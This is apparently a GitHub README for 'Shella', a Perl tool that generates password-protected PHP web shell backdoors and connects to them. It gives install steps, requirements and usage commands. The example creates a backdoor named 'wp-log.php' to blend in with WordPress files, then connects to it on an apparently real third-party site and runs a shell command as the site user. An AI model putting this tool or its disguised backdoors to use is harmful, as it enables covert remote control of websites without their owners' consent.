
## Shella | Simple Backdoor Manager with Perl

![Screenshoot](1.png)
<br>
Shella is a simple tool that is written using Perl, which functions to remote a website
<br>
### Instalation :

$ git clone https://github.com/meico-wq/Shella<br>
$ cd Shella <br>
$ perl shell.pl <br>

### Requirements :

<pre>
cpan install Config::IniFiles
cpan install LWP::UserAgent
cpan install IO::Prompt
</pre>

### Example :
<pre>

perl shell.pl -g wp-log -p mei1337
  
Perl shell |
Generate :
[+] ./shell.pl -g "nama_shell" -p "password"
Connect Server :
[+] ./shell.pl -u "url_shell" -p "password"

Backdoor berhasil dibuat dengan nama wp-log.php dan password mei1337

meicookies@heker:~/Tools$ perl shell.pl -u "https://www.pamz3d.com/wp-log.php" -p mei1337
/opt/lampp/htdocs/php-futsal$ id
uid=501(pamz3d) gid=501(pamz3d) groups=501(pamz3d)
</pre>
